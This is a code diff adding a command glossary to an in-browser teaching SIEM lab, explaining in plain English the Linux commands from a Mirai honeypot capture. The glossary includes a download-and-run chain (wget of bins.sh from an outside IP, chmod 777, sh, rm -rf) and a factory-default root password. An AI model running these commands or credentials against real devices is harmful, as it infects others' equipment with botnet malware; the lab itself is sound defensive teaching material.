@@ -3,6 +3,7 @@
 import { useEffect, useMemo, useRef, useState } from "react";
 import { T } from "./tokens";
 import type { LabProps } from "./types";
+import SyntaxHelp, { type SyntaxGroup } from "./SyntaxHelp";
 
 /* Week 13 play area: an in-browser mini-SIEM. The learner triages a real
  * honeypot capture with zero setup, the completion-safe core of the
@@ -144,6 +145,37 @@ const QUESTIONS: Q[] = [
   },
 ];
 
+/* Plain-English decoder for the Linux commands in the capture, so the learner
+ * can read the honeypot log without knowing shell. Same pullout tab used by the
+ * Code Lab (JavaScript) and the SQL injection lab. */
+const SHELL_SYNTAX: SyntaxGroup[] = [
+  {
+    group: "What the attacker looked at first",
+    items: [
+      { code: "uname -a", note: "Prints the operating system and kernel version. An attacker runs it to learn what kind of machine they just landed on." },
+      { code: "cat /proc/mounts", note: "Lists the device's filesystems. Part of the bot sizing up what sort of device this is." },
+      { code: "/bin/busybox MIRAI", note: "BusyBox is a tiny command toolbox built into routers and cameras. Calling it with a tag like MIRAI is the Mirai bot confirming it is on a device it can infect." },
+    ],
+  },
+  {
+    group: "Pulling and running the malware",
+    items: [
+      { code: "cd /tmp", note: "Moves into /tmp, the one folder every device lets anyone write to. Malware lands here because it rarely needs permission." },
+      { code: "wget http://45.9.148.100/bins.sh", note: "Downloads a file from a web address. This is how the attacker pulls the malware onto the device." },
+      { code: "chmod 777 bins.sh", note: "Gives the file full read, write and run permission for everyone. 777 is the 'anyone can do anything' setting, a classic malware tell." },
+      { code: "sh bins.sh", note: "Runs the downloaded script. This is the moment the device joins the botnet. (./bins.sh does the same thing.)" },
+      { code: "rm -rf bins.sh", note: "Force-deletes the file with no prompt. The attacker wipes the evidence straight after running it." },
+    ],
+  },
+  {
+    group: "Reading the log",
+    items: [
+      { code: "cd /tmp; wget ...; chmod 777 ...; sh ...", note: "A semicolon runs commands one after another on a single line. The whole takeover is one chained line." },
+      { code: "login attempt [root/xc3511] SUCCEEDED", note: "An SSH login that worked. 'root' is the all-powerful admin account and 'xc3511' is a factory-default password, so a guessed pair walked straight in." },
+    ],
+  },
+];
+
 export default function SiemLab({ onDidTry }: LabProps) {
   const [query, setQuery] = useState("");
   const [kindFilter, setKindFilter] = useState<Kind | "all">("all");
@@ -282,6 +314,8 @@ export default function SiemLab({ onDidTry }: LabProps) {
           })}
         </div>
       </div>
+
+      <SyntaxHelp label="Command help" intro="Every command the attacker typed, in plain English. Use it to read the honeypot log and work out what each line in the capture is doing." groups={SHELL_SYNTAX} />
     </div>
   );
 }
